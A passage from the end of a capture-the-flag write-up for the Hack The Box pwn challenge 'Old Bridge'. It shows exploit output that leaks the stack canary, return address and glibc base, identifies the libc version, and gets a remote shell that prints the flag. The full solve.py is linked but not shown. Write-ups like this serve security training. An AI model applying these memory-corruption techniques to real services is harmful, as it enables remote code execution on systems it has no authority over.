[<span class="code-green">+</span>] Leaked write() address: 0x7f8817920280
[<span class="code-green">+</span>] Glibc base address: 0x7f88178121f0
[<span class="code-blue">*</span>] Closed connection to 167.71.139.192 port 31230  
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>We can take the last three hexadecimal digits of the leaked <code>write</code> address and search in <a href="https://libc.rip">https://libc.rip</a>:</p><p><img alt="Glibc version" src="/images/HTB-Challenges/HTB-Pwn-Old-Bridge-1.webp"></p><h2 id="flag">Flag</h2><p>Eventually, we get that the last Glibc version of the list is the one that is used by the remote instance. We just update the four offsets we need and run the exploit again</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.71.139.192:31230
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b"\r\x82\xee\x8dl'P\x8f"
[<span class="code-green">+</span>] XOR saved $rbp: b'\x1d>\xa8\xde\xf2r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\xa3uE\xb3X\r\r'
[<span class="code-green">+</span>] Canary: 0x825d2a6180e38f00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffd3a53310
[<span class="code-green">+</span>] Return address: 0x55be4878aecf
[<span class="code-green">+</span>] ELF base address: 0x55be4878a000
[<span class="code-green">+</span>] Leaked write() address: 0x7f8817920280
[<span class="code-green">+</span>] Glibc base address: 0x7f8817829000
[<span class="code-blue">*</span>] Closed connection to 167.71.139.192 port 31230  
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
core
flag.txt
oldbridge
<span class="code-red">$</span> cat flag.txt
HTB{q4i1q3_i1i3_p0a_a01}
</code></pre></div><p>The full exploit code is here: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Old%20Bridge/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#brute-force-attack">Brute force attack</a></li><li><a href="#pie-bypass">PIE bypass</a></li><li><a href="#stack-pivot">Stack Pivot</a></li><li><a href="#leaking-glibc-addresses">Leaking Glibc addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>